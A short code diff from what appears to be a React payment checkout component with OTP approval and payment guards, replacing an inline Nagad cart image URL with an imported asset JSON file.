@@ -5,7 +5,7 @@ import { submitOtpForApproval } from "@/lib/otpApproval";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
-const nagadCart = { url: "/media/nagad-cart.png" };
+import nagadCart from "@/assets/nagad-cart.png.asset.json";
 import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
 import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
 import SingleCircleLoader from "@/components/payment/SingleCircleLoader";
